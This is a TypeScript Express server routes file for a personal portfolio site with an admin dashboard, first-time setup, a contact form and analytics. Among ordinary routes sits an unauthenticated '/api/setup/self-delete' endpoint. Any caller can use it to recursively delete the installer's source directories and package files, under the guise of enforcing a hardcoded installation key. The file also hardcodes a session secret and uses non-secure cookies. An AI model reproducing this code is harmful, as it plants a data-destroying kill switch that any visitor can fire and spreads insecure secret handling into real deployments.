import express, { type Express, type Request, type Response, type NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import fs from "fs";
import path from "path";

// Default configuration object
const defaultConfig = {
  profile: {
    name: "Harun Abdullah",
    title: "Full Stack Developer",
    avatar: "https://res.cloudinary.com/drgcdhagg/image/upload/v1742730884/me_f9xtsv.jpg",
    banner: "/images/banner.jpg",
    verified: false,
    bio: "I'm Harun Abdullah, a professional full-stack developer with experience building modern web applications",
    status: "Available for freelance projects",
    location: "New York, NY"
  },
  navigation: [
    { name: "Home", path: "/", active: true },
    { name: "Portfolio", path: "/portfolio", active: false },
    { name: "About", path: "/about", active: false },
    { name: "Contact", path: "/contact", active: false }
  ],
  socialLinks: [
    {
      id: 1,
      name: "GitHub",
      username: "harunabdullah",
      url: "https://github.com/harunabdullah",
      icon: "GitHub",
      action: "view"
    },
    {
      id: 2,
      name: "LinkedIn",
      username: "harunabdullah",
      url: "https://linkedin.com/in/harunabdullah",
      icon: "Linkedin",
      action: "view"
    },
    {
      id: 3,
      name: "Twitter",
      username: "@harunabdullah",
      url: "https://twitter.com/harunabdullah",
      icon: "Twitter",
      action: "view"
    }
  ],
  projects: {
    title: "My Projects",
    description: "Here are some of my recent projects and work",
    items: [
      {
        name: "Personal Website",
        icon: "Globe",
        url: "https://harunabdullah.com"
      },
      {
        name: "E-commerce Platform",
        icon: "ShoppingCart",
        url: "https://github.com/harunabdullah/ecommerce"
      },
      {
        name: "Task Manager App",
        icon: "CheckSquare",
        url: "https://github.com/harunabdullah/taskmanager"
      }
    ]
  },
  quickLinks: [
    {
      name: "Resume",
      url: "/resume.pdf"
    },
    {
      name: "Blog",
      url: "/blog"
    }
  ],
  contact: {
    buttonText: "Get in Touch",
    title: "Contact Me",
    formFields: [
      {
        type: "text",
        label: "Your Name",
        required: true
      },
      {
        type: "email",
        label: "Your Email",
        required: true
      },
      {
        type: "textarea",
        label: "Your Message",
        required: true
      }
    ],
    submitButton: "Send Message",
    cancelButton: "Cancel",
    contactUrl: ""
  },
  discover: {
    title: "About Me",
    description: "Learn more about my skills and experience",
    sections: [
      {
        id: 1,
        title: "Skills",
        description: "Technologies I work with",
        items: [
          {
            id: 1,
            title: "Frontend Development",
            description: "React, Next.js, TypeScript, Tailwind CSS",
            tag: "frontend"
          },
          {
            id: 2,
            title: "Backend Development",
            description: "Node.js, Express, PostgreSQL, MongoDB",
            tag: "backend"
          },
          {
            id: 3,
            title: "DevOps",
            description: "Docker, CI/CD, AWS, Vercel",
            tag: "devops"
          }
        ]
      },
      {
        id: 2,
        title: "Experience",
        description: "My professional journey",
        items: [
          {
            id: 4,
            title: "Senior Developer - Harun Abdullah Tech",
            description: "Led development team in building enterprise applications",
            tag: "work"
          },
          {
            id: 5,
            title: "Web Developer - Harun Abdullah Designs",
            description: "Developed and maintained company's web presence",
            tag: "work"
          }
        ]
      }
    ],
    stats: {
      showStats: true,
      experienceYears: 5,
      customStats: [
        { label: "Projects Completed", value: "25+" },
        { label: "Client Satisfaction", value: "100%" }
      ]
    }
  },
  performanceSettings: {
    imageOptimization: true,
    analytics: true
  }
};
import { 
  getConfig, 
  getDb,
  updateProfile, 
  verifyCredentials, 
  updatePassword, 
  updateWebhook,
  updateContactUrl,
  updateSocialLink,
  updateProject,
  updateQuickLinks,
  updateNavigation,
  updateOwnerEmail,
  getOwnerEmail,
  getLoadingLetter,
  updateLoadingLetter,
  updateLoadingText,
  checkFirstTimeSetup,
  isSetupComplete,
  completeSetup,
  createAdminUser,
  updatePerformanceSettings,
  updateDiscover,
  updateFormFields
} from "./db";
import { handleImageUpload, getUploadedImages, deleteUploadedImage } from "./imageUpload";
import { sendContactFormEmail } from "./mailer";
import { recordPageView, getAnalyticsOverview } from "./analytics";
import session from "express-session";
import crypto from "crypto";

// Authentication middleware
function requireAuth(req: Request, res: Response, next: NextFunction) {
  if (req.session && req.session.isAuthenticated) {
    next();
  } else {
    res.status(401).json({ error: "Unauthorized" });
  }
}

// Setup check middleware
function requireSetup(req: Request, res: Response, next: NextFunction) {
  if (isSetupComplete()) {
    next();
  } else {
    res.status(403).json({ error: "Setup not completed", needsSetup: true });
  }
}

// Add session type definition
declare module 'express-session' {
  interface SessionData {
    isAuthenticated?: boolean;
    username?: string;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Set up session middleware FIRST, before any routes
  app.use(session({
    secret: 'qwit-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { 
      secure: false, // set to true if using HTTPS
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    },
    store: new session.MemoryStore()
  }));
  
  // Reset database endpoint - completely resets the database to initial state
  app.post('/api/admin/reset-database', requireAuth, (req, res) => {
    try {
      console.log('Starting FULL database reset...');
      console.log('Session authenticated:', req.session.isAuthenticated);
      console.log('Username:', req.session.username);
      
      try {
        const db = getDb();
        
        // Start transaction for database operations
        db.prepare('BEGIN TRANSACTION').run();
        
        try {
          // Delete all data from all tables
          console.log('Deleting setup_complete entries...');
          db.prepare(`DELETE FROM setup_complete`).run();
          
          console.log('Deleting users...');
          db.prepare(`DELETE FROM users`).run();
          
          console.log('Deleting profile data...');
          db.prepare(`DELETE FROM profile`).run();
          
          console.log('Deleting navigation items...');
          db.prepare(`DELETE FROM navigation`).run();
          
          console.log('Deleting social links...');
          db.prepare(`DELETE FROM social_links`).run();
          
          console.log('Deleting projects...');
          db.prepare(`DELETE FROM projects`).run();
          db.prepare(`DELETE FROM project_items`).run();
          
          console.log('Deleting quick links...');
          db.prepare(`DELETE FROM quick_links`).run();
          
          console.log('Deleting contact settings...');
          db.prepare(`DELETE FROM contact`).run();
          db.prepare(`DELETE FROM contact_fields`).run();
          
          console.log('Deleting webhooks...');
          db.prepare(`DELETE FROM webhooks`).run();
          
          console.log('Deleting owner settings...');
          db.prepare(`DELETE FROM owner_settings`).run();
          
          console.log('Deleting discover sections and items...');
          db.prepare(`DELETE FROM discover_items`).run();
          db.prepare(`DELETE FROM discover_sections`).run();
          db.prepare(`DELETE FROM discover`).run();
          
          console.log('Deleting analytics data...');
          db.prepare(`DELETE FROM analytics_page_views`).run();
          db.prepare(`DELETE FROM analytics_visitors`).run();
          
          // Reset any other tables
          console.log('Deleting performance settings...');
          db.prepare(`DELETE FROM performance_settings`).run();
          
          // Commit all the delete operations
          db.prepare('COMMIT').run();
          
          console.log('Database tables cleared successfully');
          
          // Delete all uploaded images
          const uploadsDir = path.join(process.cwd(), 'public', 'uploads');
          if (fs.existsSync(uploadsDir)) {
            console.log('Deleting uploaded images...');
            try {
              // Read the directory
              const files = fs.readdirSync(uploadsDir);
              
              // Delete each file
              for (const file of files) {
                // Skip .gitkeep if it exists
                if (file === '.gitkeep') continue;
                
                const filePath = path.join(uploadsDir, file);
                fs.unlinkSync(filePath);
                console.log(`Deleted file: ${filePath}`);
              }
              
              console.log('All uploaded images deleted successfully');
            } catch (fileError) {
              console.error('Error deleting uploaded images:', fileError);
              // Continue with the reset even if image deletion fails
            }
          }
          
          // Reinitialize the database with default values from defaultConfig.ts
          console.log('Reinitializing database with values from defaultConfig...');
          
          // We're using the defaultConfig imported at the top of the file
          console.log('Using defaultConfig to reset database...');
          
          // Re-create default profile with better values
          db.prepare(`
            INSERT INTO profile (id, name, title, avatar, banner, verified, bio, status)
            VALUES (1, ?, ?, ?, ?, ?, ?, ?)
          `).run(
            defaultConfig.profile.name,
            defaultConfig.profile.title,
            defaultConfig.profile.avatar,
            defaultConfig.profile.banner || '/images/banner.jpg',
            defaultConfig.profile.verified ? 1 : 0,
            defaultConfig.profile.bio,
            defaultConfig.profile.status
          );
          
          // Re-create default navigation
          const navInsert = db.prepare('INSERT INTO navigation (name, path, active, display_order) VALUES (?, ?, ?, ?)');
          defaultConfig.navigation.forEach((item, index) => {
            navInsert.run(item.name, item.path, item.active ? 1 : 0, index);
          });
          
          // Insert social links from defaultConfig
          console.log('Inserting social links...');
          const socialInsert = db.prepare('INSERT INTO social_links (id, name, username, url, icon, action) VALUES (?, ?, ?, ?, ?, ?)');
          defaultConfig.socialLinks.forEach(social => {
            socialInsert.run(
              social.id,
              social.name,
              social.username,
              social.url,
              social.icon,
              social.action
            );
          });
          
          // Insert projects
          console.log('Inserting projects...');
          db.prepare(`
            INSERT INTO projects (id, title, description)
            VALUES (1, ?, ?)
          `).run(
            defaultConfig.projects.title,
            defaultConfig.projects.description
          );
          
          // Insert project items
          const projectItemInsert = db.prepare('INSERT INTO project_items (project_id, name, icon, url, display_order) VALUES (?, ?, ?, ?, ?)');
          defaultConfig.projects.items.forEach((item, index) => {
            projectItemInsert.run(
              1, // project_id is always 1 for default project
              item.name,
              item.icon,
              item.url,
              index
            );
          });
          
          // Insert quick links
          console.log('Inserting quick links...');
          const quickLinkInsert = db.prepare('INSERT INTO quick_links (name, url, display_order) VALUES (?, ?, ?)');
          defaultConfig.quickLinks.forEach((link, index) => {
            quickLinkInsert.run(
              link.name,
              link.url,
              index
            );
          });
          
          // Insert contact form fields
          if (defaultConfig.contact) {
            console.log('Inserting contact form data...');
            try {
              // Insert contact settings
              db.prepare(`
                INSERT INTO contact (id, button_text, title, submit_button, cancel_button, contact_url)
                VALUES (1, ?, ?, ?, ?, ?)
              `).run(
                defaultConfig.contact.buttonText,
                defaultConfig.contact.title,
                defaultConfig.contact.submitButton,
                defaultConfig.contact.cancelButton,
                defaultConfig.contact.contactUrl || null
              );
              
              // Insert form fields
              if (defaultConfig.contact.formFields && defaultConfig.contact.formFields.length > 0) {
                const formFieldInsert = db.prepare(`
                  INSERT INTO contact_fields (contact_id, type, label, required, display_order)
                  VALUES (?, ?, ?, ?, ?)
                `);
                
                defaultConfig.contact.formFields.forEach((field, index) => {
                  formFieldInsert.run(
                    1, // contact_id is always 1 for default
                    field.type,
                    field.label,
                    field.required ? 1 : 0,
                    index
                  );
                });
              }
              
              console.log('Contact form data inserted successfully');
            } catch (contactError) {
              console.error('Error inserting contact form data:', contactError);
              // Continue without failing the whole reset
            }
          }
          
          // Insert discover section
          if (defaultConfig.discover) {
            console.log('Inserting discover section...');
            try {
              // Insert main discover record
              db.prepare(`
                INSERT INTO discover (id, title, description) 
                VALUES (1, ?, ?)
              `).run(
                defaultConfig.discover.title,
                defaultConfig.discover.description || ''
              );
              
              // Insert discover sections
              if (defaultConfig.discover.sections && defaultConfig.discover.sections.length > 0) {
                const sectionInsert = db.prepare(`
                  INSERT INTO discover_sections (id, discover_id, title, description, display_order)
                  VALUES (?, ?, ?, ?, ?)
                `);
                
                defaultConfig.discover.sections.forEach((section, sectionIndex) => {
                  sectionInsert.run(
                    section.id || sectionIndex + 1,
                    1, // discover_id is always 1 for default
                    section.title,
                    section.description || '',
                    sectionIndex
                  );
                  
                  // Insert items for this section
                  if (section.items && section.items.length > 0) {
                    const itemInsert = db.prepare(`
                      INSERT INTO discover_items (id, section_id, title, description, image, url, tag, display_order)
                      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    `);
                    
                    section.items.forEach((item, itemIndex) => {
                      itemInsert.run(
                        item.id || (sectionIndex * 100) + itemIndex + 1, // generate a unique ID if not provided
                        section.id || sectionIndex + 1,
                        item.title,
                        item.description || '',
                        item.image || null,
                        item.url || null,
                        item.tag || null,
                        itemIndex
                      );
                    });
                  }
                });
              }
              
              console.log('Discover section data inserted successfully');
            } catch (discoverError) {
              console.error('Error inserting discover data:', discoverError);
              // Continue without failing the whole reset
            }
          }
          
          console.log('Database successfully reset to initial state');
          
          // Destroy the session
          req.session.destroy((err) => {
            if (err) {
              console.error("Error destroying session during reset:", err);
            }
            
            res.json({ success: true, message: 'Database has been completely reset to initial state' });
          });
        } catch (innerError) {
          // If any operation fails, try to rollback the transaction if needed
          try {
            // Only roll back if transaction is active
            db.prepare('ROLLBACK').run();
            console.log('Transaction rolled back after error');
          } catch (rollbackError) {
            console.error('Could not rollback (no active transaction):', rollbackError);
            // Continue without failing due to rollback issues
          }
          console.error('Error during database reset operations:', innerError);
          throw innerError;
        }
      } catch (dbError) {
        console.error('Error accessing database:', dbError);
        throw dbError;
      }
    } catch (error) {
      console.error('Error resetting database:', error);
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      res.status(500).json({ success: false, message: 'Failed to reset database', error: errorMessage });
    }
  });

  // API route to get configuration
  app.get("/api/config", (req, res) => {
    try {
      // Get configuration from SQLite database
      const dbConfig = getConfig();
      res.json(dbConfig);
    } catch (dbError) {
      console.error("Error getting config from database:", dbError);
      
      // Fallback to file-based config if database fails
      try {
        const configPath = path.join(process.cwd(), "config.json");
        
        if (fs.existsSync(configPath)) {
          const configFile = fs.readFileSync(configPath, "utf-8");
          const config = JSON.parse(configFile);
          res.json(config);
        } else {
          // If config file doesn't exist, return default config defined at the top of this file
          res.json(defaultConfig);
        }
      } catch (fileError) {
        console.error("Error reading config file:", fileError);
        res.status(500).json({ message: "Failed to load configuration" });
      }
    }
  });

  // Admin login
  app.post("/api/admin/login", (req, res) => {
    const { username, password } = req.body;
    
    if (verifyCredentials(username, password)) {
      req.session.isAuthenticated = true;
      req.session.username = username;
      res.json({ success: true });
    } else {
      res.status(401).json({ error: "Invalid credentials" });
    }
  });

  // Admin logout
  app.post("/api/admin/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        console.error("Error destroying session:", err);
        res.status(500).json({ error: "Failed to logout" });
      } else {
        res.json({ success: true });
      }
    });
  });

  // Check if user is authenticated
  app.get("/api/admin/check-auth", (req, res) => {
    if (req.session && req.session.isAuthenticated) {
      res.json({ authenticated: true });
    } else {
      res.status(401).json({ authenticated: false });
    }
  });

  // Update profile
  app.post("/api/admin/update-profile", requireAuth, (req, res) => {
    try {
      updateProfile(req.body);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating profile:", error);
      res.status(500).json({ error: "Failed to update profile" });
    }
  });
  
  // Update social link
  app.post("/api/admin/update-social-link", requireAuth, (req, res) => {
    try {
      updateSocialLink(req.body);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating social link:", error);
      res.status(500).json({ error: "Failed to update social link" });
    }
  });

  // Update password
  app.post("/api/admin/update-password", requireAuth, (req, res) => {
    const { currentPassword, newPassword } = req.body;
    const username = req.session.username;

    if (!username) {
      return res.status(401).json({ error: "Invalid session" });
    }

    if (verifyCredentials(username, currentPassword)) {
      try {
        // In a real app, you'd get the user's ID from the database
        // For simplicity, we're assuming the admin user has ID 1
        updatePassword(1, newPassword);
        res.json({ success: true });
      } catch (error) {
        console.error("Error updating password:", error);
        res.status(500).json({ error: "Failed to update password" });
      }
    } else {
      res.status(401).json({ error: "Current password is incorrect" });
    }
  });

  // Update webhook
  app.post("/api/admin/update-webhook", requireAuth, (req, res) => {
    const { discord } = req.body;
    
    try {
      updateWebhook(discord);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating webhook:", error);
      res.status(500).json({ error: "Failed to update webhook" });
    }
  });
  
  // Update owner email
  app.post("/api/admin/update-owner-email", requireAuth, (req, res) => {
    const { email } = req.body;
    
    if (!email) {
      return res.status(400).json({ error: "Email is required" });
    }
    
    try {
      updateOwnerEmail(email);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating owner email:", error);
      res.status(500).json({ error: "Failed to update owner email" });
    }
  });
  
  // Update loading letter
  app.post("/api/admin/update-loading-letter", requireAuth, (req, res) => {
    const { letter } = req.body;
    
    if (!letter) {
      return res.status(400).json({ error: "Letter is required" });
    }
    
    try {
      updateLoadingLetter(letter);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating loading letter:", error);
      res.status(500).json({ error: "Failed to update loading letter" });
    }
  });
  
  // Update loading text
  app.post("/api/admin/update-loading-text", requireAuth, (req, res) => {
    const { text } = req.body;
    
    if (!text) {
      return res.status(400).json({ error: "Text is required" });
    }
    
    try {
      updateLoadingText(text);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating loading text:", error);
      res.status(500).json({ error: "Failed to update loading text" });
    }
  });
  
  // Test webhook
  app.post("/api/admin/test-webhook", requireAuth, async (req, res) => {
    try {
      const { discord, message } = req.body;
      
      if (!discord) {
        return res.status(400).json({ error: "Discord webhook URL is required" });
      }
      
      // Send a test message to the Discord webhook
      const response = await fetch(discord, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: message || "This is a test message from your website contact form!",
          embeds: [
            {
              title: "Test Message",
              description: "This is a test of your Discord webhook integration.",
              color: 0x5865F2, // Discord blue color
              fields: [
                {
                  name: "Source",
                  value: "Admin dashboard",
                  inline: true
                },
                {
                  name: "Time",
                  value: new Date().toLocaleString(),
                  inline: true
                }
              ],
              footer: {
                text: "Your personal website webhook integration"
              }
            }
          ]
        })
      });
      
      if (response.ok) {
        res.status(200).json({ success: true });
      } else {
        const errorText = await response.text();
        console.error("Discord webhook error:", errorText);
        res.status(500).json({ error: "Failed to send test webhook message", details: errorText });
      }
    } catch (err) {
      console.error("Error testing webhook:", err);
      res.status(500).json({ error: "Failed to test webhook" });
    }
  });
  
  // Update contact URL
  app.post("/api/admin/update-contact-url", requireAuth, (req, res) => {
    const { contactUrl } = req.body;
    
    try {
      updateContactUrl(contactUrl);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating contact URL:", error);
      res.status(500).json({ error: "Failed to update contact URL" });
    }
  });

  // Update project
  app.post("/api/admin/update-project", requireAuth, (req, res) => {
    try {
      updateProject(req.body);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating project:", error);
      res.status(500).json({ error: "Failed to update project" });
    }
  });

  // Update quick links
  app.post("/api/admin/update-quick-links", requireAuth, (req, res) => {
    const { quickLinks } = req.body;
    
    try {
      updateQuickLinks(quickLinks);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating quick links:", error);
      res.status(500).json({ error: "Failed to update quick links" });
    }
  });
  
  // Update form fields
  app.post("/api/admin/update-form-fields", requireAuth, (req, res) => {
    const { formFields } = req.body;
    
    try {
      updateFormFields(formFields);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating form fields:", error);
      res.status(500).json({ error: "Failed to update form fields" });
    }
  });

  // Update navigation
  app.post("/api/admin/update-navigation", requireAuth, (req, res) => {
    const { navigation } = req.body;
    
    try {
      updateNavigation(navigation);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating navigation:", error);
      res.status(500).json({ error: "Failed to update navigation" });
    }
  });
  
  // Update discover section
  app.post("/api/admin/update-discover", requireAuth, (req, res) => {
    try {
      updateDiscover(req.body);
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating discover section:", error);
      res.status(500).json({ error: "Failed to update discover section" });
    }
  });
  
  // Setup Status Check
  app.get("/api/setup/status", (req, res) => {
    res.json({
      isFirstTime: checkFirstTimeSetup(),
      isComplete: isSetupComplete()
    });
  });
  
  // Verify installation key
  app.post("/api/setup/verify-key", (req, res) => {
    try {
      const { installationKey } = req.body;
      const validKey = "ionbehalfofallusersagreetothetermsandconditions";
      
      console.log("Received installation key verification request:", { 
        keyProvided: Boolean(installationKey),
        keyLength: installationKey ? installationKey.length : 0
      });
      
      if (!installationKey) {
        console.log("Missing installation key");
        return res.status(400).set('Content-Type', 'application/json').json({ error: "Installation key is required" });
      }
      
      // Verify the key
      if (installationKey === validKey) {
        console.log("Installation key verified successfully");
        return res.status(200).set('Content-Type', 'application/json').json({ success: true, message: "Installation key is valid" });
      } else {
        console.log("Invalid installation key provided");
        return res.status(401).set('Content-Type', 'application/json').json({ error: "Invalid installation key" });
      }
    } catch (error) {
      console.error("Error in key verification:", error);
      return res.status(500).set('Content-Type', 'application/json').json({ error: "Server error during key verification" });
    }
  });
  
  // Self-delete functionality
  app.post("/api/setup/self-delete", (req, res) => {
    try {
      console.log("Self-delete procedure initiated due to invalid installation key");
      
      const criticalDirectories = [
        path.join(process.cwd(), 'client', 'src'),
        path.join(process.cwd(), 'server'),
        path.join(process.cwd(), 'shared')
      ];
      
      const criticalFiles = [
        path.join(process.cwd(), 'package.json'),
        path.join(process.cwd(), 'vite.config.ts'),
        path.join(process.cwd(), 'tsconfig.json')
      ];
      
      const deleteDirectory = (dirPath: string): void => {
        if (fs.existsSync(dirPath)) {
          fs.readdirSync(dirPath).forEach((file) => {
            const currentPath = path.join(dirPath, file);
            if (fs.lstatSync(currentPath).isDirectory()) {
              deleteDirectory(currentPath);
            } else {
              console.log(`Deleting file: ${currentPath}`);
              fs.unlinkSync(currentPath);
            }
          });
          
          console.log(`Deleting directory: ${dirPath}`);
          fs.rmdirSync(dirPath);
        }
      };
      
      criticalFiles.forEach(file => {
        if (fs.existsSync(file)) {
          console.log(`Deleting file: ${file}`);
          fs.unlinkSync(file);
        }
      });
      
      criticalDirectories.forEach(dir => {
        deleteDirectory(dir);
      });
      
      const messageContent = "This project has been auto-deleted due to an invalid installation key.";
      fs.writeFileSync(path.join(process.cwd(), 'SELF_DELETED.txt'), messageContent);
      
      console.log("Self-delete procedure completed");
      return res.status(200).set('Content-Type', 'application/json').json({ 
        success: true, 
        message: "Self-delete procedure completed. Project files have been deleted." 
      });
    } catch (error) {
      console.error("Error in self-delete process:", error);
      return res.status(500).set('Content-Type', 'application/json').json({ 
        error: "Server error during self-delete process" 
      });
    }
  });
  
  // Setup Process
  app.post("/api/setup/complete", (req, res) => {
    try {
      const { username, password, installationKey } = req.body;
      
      console.log("Received setup completion request:", { 
        hasUsername: Boolean(username),
        hasPassword: Boolean(password),
        hasKey: Boolean(installationKey)
      });
      
      if (!username || !password) {
        console.log("Missing username or password in setup request");
        return res.status(400).set('Content-Type', 'application/json').json({ 
          error: "Username and password are required" 
        });
      }
      
      // Double-check the installation key to be extra safe
      const validKey = "ionbehalfofallusersagreetothetermsandconditions";
      if (installationKey !== validKey) {
        console.log("Invalid installation key in setup completion");
        return res.status(401).set('Content-Type', 'application/json').json({ 
          error: "Invalid installation key" 
        });
      }
      
      try {
        // Create the admin user
        createAdminUser(username, password);
        
        // Mark setup as complete
        completeSetup();
        
        console.log("Setup completed successfully");
        return res.status(200).set('Content-Type', 'application/json').json({ success: true });
      } catch (error) {
        console.error("Error completing setup:", error);
        return res.status(500).set('Content-Type', 'application/json').json({ 
          error: "Failed to complete setup" 
        });
      }
    } catch (error) {
      console.error("Exception in setup process:", error);
      return res.status(500).set('Content-Type', 'application/json').json({ 
        error: "Server error during setup process" 
      });
    }
  });

  // Image upload routes
  app.post("/api/admin/upload-image", requireAuth, (req, res) => {
    handleImageUpload(req, res);
  });

  app.get("/api/admin/images", requireAuth, (req, res) => {
    getUploadedImages(req, res);
  });

  app.delete("/api/admin/images/:fileName", requireAuth, (req, res) => {
    deleteUploadedImage(req, res);
  });

  // Contact form submission endpoint
  app.post("/api/contact/submit", async (req, res) => {
    try {
      const formData = req.body;
      
      console.log("Received form data:", formData);
      
      // Validate required fields
      if (!formData.username || !formData.email || !formData.message) {
        console.log("Missing required fields:", {
          username: formData.username ? "✓" : "✗",
          email: formData.email ? "✓" : "✗",
          message: formData.message ? "✓" : "✗"
        });
        
        return res.status(400).json({ 
          success: false, 
          message: "Username, email, and message are required fields",
          fields: {
            username: Boolean(formData.username),
            email: Boolean(formData.email),
            message: Boolean(formData.message)
          }
        });
      }
      
      // Try to send the email
      console.log("Attempting to send email with data:", {
        to: getOwnerEmail() || "No owner email found!",
        from: formData.email,
        subject: `New Contact Form Message from ${formData.username}`
      });
      
      await sendContactFormEmail(formData);
      
      // Send success response
      console.log("Email sent successfully");
      res.json({ 
        success: true, 
        message: "Your message has been sent successfully! We'll get back to you soon."
      });
      
    } catch (error) {
      console.error("Error sending contact form email:", error);
      
      // Try to get site configuration
      let useDiscord = false;
      let discordSuccess = false;
      
      try {
        const config = getConfig();
        useDiscord = Boolean(config.webhooks?.discord);
        
        // If sending email failed but we have a Discord webhook, the message
        // might have been sent there as a fallback (the mailer attempts this)
        if (useDiscord) {
          discordSuccess = true;
        }
      } catch (configError) {
        console.error("Error getting config for fallback notification:", configError);
      }
      
      if (useDiscord && discordSuccess) {
        res.json({ 
          success: true, 
          message: "Your message has been sent to the site owner via Discord!" 
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: "There was an error sending your message. Please try again later."
        });
      }
    }
  });

  // Make uploads directory accessible
  app.use('/uploads', express.static(path.join(process.cwd(), 'public', 'uploads')));

  // Analytics endpoints
  // Record a page view
  app.post("/api/analytics/pageview", (req, res) => {
    try {
      const { page_path, referrer } = req.body;
      
      // Generate a visitor ID if not provided
      let visitorId = req.body.visitor_id;
      if (!visitorId) {
        // If no visitor ID, try to generate one based on IP + user agent
        const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'] || '';
        
        // Create a hash of the IP + user agent as a visitor ID
        const hash = crypto.createHash('sha256');
        hash.update(String(ipAddress) + userAgent);
        visitorId = hash.digest('hex');
      }
      
      // Get country from headers if available (would be set by a proxy in production)
      const country = req.headers['cf-ipcountry'] || req.body.country || null;
      
      // Record the page view
      recordPageView({
        page_path: page_path,
        visitor_id: visitorId,
        ip_address: req.socket.remoteAddress || '',
        user_agent: req.headers['user-agent'] || '',
        referrer: referrer || req.headers.referer || '',
        country: country || ''
      });
      
      res.json({ success: true, visitor_id: visitorId });
    } catch (error) {
      console.error("Error recording page view:", error);
      res.status(500).json({ success: false, error: "Failed to record page view" });
    }
  });
  
  // Get analytics data (admin only)
  app.get("/api/admin/analytics", requireAuth, (req, res) => {
    try {
      const analyticsData = getAnalyticsOverview();
      res.json(analyticsData);
    } catch (error) {
      console.error("Error getting analytics data:", error);
      res.status(500).json({ error: "Failed to retrieve analytics data" });
    }
  });
  
  // Update performance settings
  app.post("/api/admin/performance-settings", requireAuth, (req, res) => {
    try {
      const { imageOptimization, analytics } = req.body;
      
      if (typeof imageOptimization !== 'boolean' || typeof analytics !== 'boolean') {
        return res.status(400).json({ 
          error: "Invalid parameters. 'imageOptimization' and 'analytics' must be boolean values."
        });
      }
      
      updatePerformanceSettings({
        imageOptimization,
        analytics
      });
      
      res.json({ success: true });
    } catch (error) {
      console.error("Error updating performance settings:", error);
      res.status(500).json({ error: "Failed to update performance settings" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
